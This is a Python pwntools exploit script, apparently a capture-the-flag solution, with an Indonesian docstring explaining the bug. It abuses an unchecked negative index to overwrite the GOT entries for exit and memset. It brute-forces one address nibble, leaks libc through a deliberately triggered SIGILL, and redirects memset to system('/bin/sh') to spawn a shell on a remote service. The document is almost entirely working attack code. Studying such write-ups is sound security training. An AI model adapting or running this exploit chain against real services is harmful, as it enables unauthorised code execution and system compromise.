"""
Tidak ada pengecekan nilai index jika kurang dari 0, sehingga kita bisa melakukan overwrite GOT.
GOT exit akan kita overwrite dengan fungsi main dengan melakukan brute force nibble ke-4 (16 kemungkinan).
Lalu aktifkan debug mode dan panggil memset dengan memilih menu delete. Lalu ubah address memset ke instuksi
yang illegal (di gdb jika didisasembly hasilnya '(bad)') untuk mendapatkan SIGILL untuk melakukan leak libc.
Kita akan kembali ke fungsi main karena GOT exit telah kita overwrite dengan fungsi main. Setelah itu, overwrite
GOT memset dengan address fungsi system dan buat satu entry dengan string '/bin/sh. Lalu delete entry tersebut sehingga
system("/bin/sh") yang akan terpanggil.
"""

from pwn import *

l = ELF("./libc.so", checksec=False)

def toggle_debug():
    r.sendlineafter("> ", "0")

def add(usr, pas, note):
    r.sendlineafter("> ", "1")
    r.sendafter(" : ", usr)
    r.sendafter(" : ", pas)
    r.sendafter(" : ", note)

def edit(inx, usr, pas, note):
    r.sendlineafter("> ", "2")
    r.sendlineafter(" : ", str(inx))
    r.sendafter(" : ", usr)
    r.sendafter(" : ", pas)
    r.sendafter(" : ", note)

def delete(inx):
    r.sendlineafter("> ", "4")
    r.sendlineafter(" : ", str(inx))

def leak_sigill():
    r.recvuntil("address ")
    rip = int(r.recvline()[:-1], 16)
    return rip

# brute force
while(1):
    r = remote("0.0.0.0", 51707)

    toggle_debug()
    delete(0) # ubah address memset ke libc

    edit(-1, p16(0x579b), p8(0x70), p8(0xa0)) # ubah GOT exit ke fungsi main
    edit(-2, p8(0x46), p8(0x92), p8(0xe0)) # ubah address fungsi memset untuk menyebabkan SIGILL
    
    delete(0) # SIGILL

    libc_leak = leak_sigill() # leak libc address
    print("leak :", hex(libc_leak))
    l.address = libc_leak - 0x18ea92

    try: # jika bisa maka address fungsi main di GOT exit benar
        edit(-2, p8(0x46), p64(l.symbols["system"]), p64(l.symbols["getchar"])) # edit GOT memset menjadi system
        add("/bin/sh", "/bin/sh", "/bin/sh") # buat entry "/bin/sh" untuk argumen system
        delete(0) # panggil system("/bin/sh")
    except EOFError: # jika address fungsi main salah
        r.close()
    else:
        r.interactive()

